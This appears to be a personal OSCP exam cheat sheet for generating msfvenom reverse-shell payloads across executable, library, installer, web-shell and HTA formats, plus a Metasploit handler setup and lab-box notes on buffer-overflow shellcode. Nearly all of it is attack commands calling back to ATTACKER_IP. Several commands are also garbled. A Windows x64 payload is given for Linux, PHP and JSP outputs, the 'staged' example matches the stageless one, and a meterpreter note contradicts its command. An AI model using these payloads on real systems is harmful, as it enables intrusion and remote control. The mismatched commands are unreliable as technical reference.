# Msfvenom Payload Generation

**Note: Metasploit/msfconsole allowed on ONE machine only. But msfvenom (payload generation) is unlimited.**

---

## Linux
```bash
# Staged (smaller, needs handler)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf

# Stageless (standalone, use with nc listener)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
```

## Windows
```bash
# Stageless EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe

# Stageless DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o shell.dll

# MSI (for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o shell.msi

# ASPX webshell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f aspx -o shell.aspx

# HTA (client-side)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o shell.hta
```

## Web payloads
```bash
# PHP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.php

# JSP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f war -o shell.war
```

---

## Staged vs Stageless

- **Staged** (shell/reverse_tcp): smaller payload, needs Metasploit handler -- uses your 1 Metasploit allowance
- **Stageless** (shell_reverse_tcp): larger but works with plain `nc` listener -- no Metasploit needed
- **For OSCP: prefer stageless** to save your Metasploit use

## Metasploit handler (for staged payloads)
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 443
run
```

See also: [[Reverse-Shells]] for manual shell one-liners, [[File-Transfers]] for getting payloads onto target.

## From Your Boxes

> **Buff** (HTB) - msfvenom shellcode for CloudMe buffer overflow exploit through chisel tunnel
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8080 -b '\x00\x0A\x0D' -f python -v payload`
> - Lesson: For buffer overflows, use `-b` to exclude bad characters and `-f python` for exploit script integration. First tried port 53 but it failed - try different ports if shell doesn't connect

> **Berlin** (Course/OSCP B) - msfvenom ELF binary for Linux privesc when nc/bash shells wouldn't trigger through JDWP exploit
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=8443 -f elf > shell.elf`, transferred to target, ran through proxychains jdwp-shellifier
> - Lesson: When one-liner shells fail through an exploit, an msfvenom ELF/EXE binary is more reliable. Stageless (`shell_reverse_tcp`) works with plain nc listener

> **Internal** (PG/Windows) - msfvenom meterpreter payload for MS09-050 SMB buffer overflow on Server 2008
> - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=80 EXITFUNC=thread -f python`
> - Lesson: For buffer overflow exploits, use `EXITFUNC=thread` to avoid crashing the service. Meterpreter is staged - requires msfconsole handler (uses your one Metasploit allowance)
